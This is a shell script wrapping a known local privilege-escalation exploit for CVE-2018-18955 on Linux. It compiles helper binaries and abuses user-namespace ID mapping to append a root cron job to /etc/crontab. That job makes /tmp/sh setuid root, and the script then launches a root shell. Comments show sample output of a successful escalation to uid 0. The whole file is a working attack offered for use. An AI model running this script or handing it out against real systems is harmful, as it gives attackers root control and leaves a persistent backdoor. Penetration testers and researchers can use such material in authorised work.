#!/bin/sh
# wrapper for Jann Horn's exploit for CVE-2018-18955
# ---
# test@linux-mint-19-2:~/exploit$ ./exploit.sh 
# [*] Compiling...
# [*] Writing payload to /tmp...
# [*] Adding cron job... (wait a minute)
# [.] starting
# [.] setting up namespace
# [~] done, namespace sandbox set up
# [.] mapping subordinate ids
# [.] subuid: 165536
# [.] subgid: 165536
# [~] done, mapped subordinate ids
# [.] executing subshell
# [+] Success:
# -rwsrwxr-x 1 root root 8384 Nov 20 05:21 /tmp/sh
# [!] Remember to clean up /etc/crontab
# [*] Launching root shell: /tmp/sh
# root@linux-mint-19-2:~/exploit# id
# uid=0(root) gid=0(root) groups=0(root),1001(test)


rootshell="/tmp/sh"

command_exists() {
  command -v "${1}" >/dev/null 2>/dev/null
}

if ! command_exists gcc; then
  echo '[-] gcc is not installed'
  exit 1
fi

if ! command_exists newuidmap; then
  echo '[-] newuidmap is not installed'
  exit 1
fi

if ! command_exists newgidmap; then
  echo '[-] newgidmap is not installed'
  exit 1
fi

echo "[*] Compiling..."

gcc subuid_shell.c -o subuid_shell
gcc subshell.c -o subshell
gcc rootshell.c -o "${rootshell}"

echo "[*] Writing payload to /tmp..."

echo "#!/bin/sh\nchown root:root ${rootshell};chmod u+s ${rootshell}" > /tmp/payload
chmod +x /tmp/payload

echo "[*] Adding cron job... (wait a minute)"

echo 'echo "* * * * * root /tmp/payload" >> /etc/crontab' | ./subuid_shell ./subshell
sleep 60

if test -u "${rootshell}"; then
  echo '[+] Success:'
  ls -la "${rootshell}"
else
  echo '[-] Failed'
  rm "${rootshell}"
fi

rm /tmp/payload

echo "[!] Remember to clean up /etc/crontab"

echo "[*] Launching root shell: ${rootshell}"
$rootshell

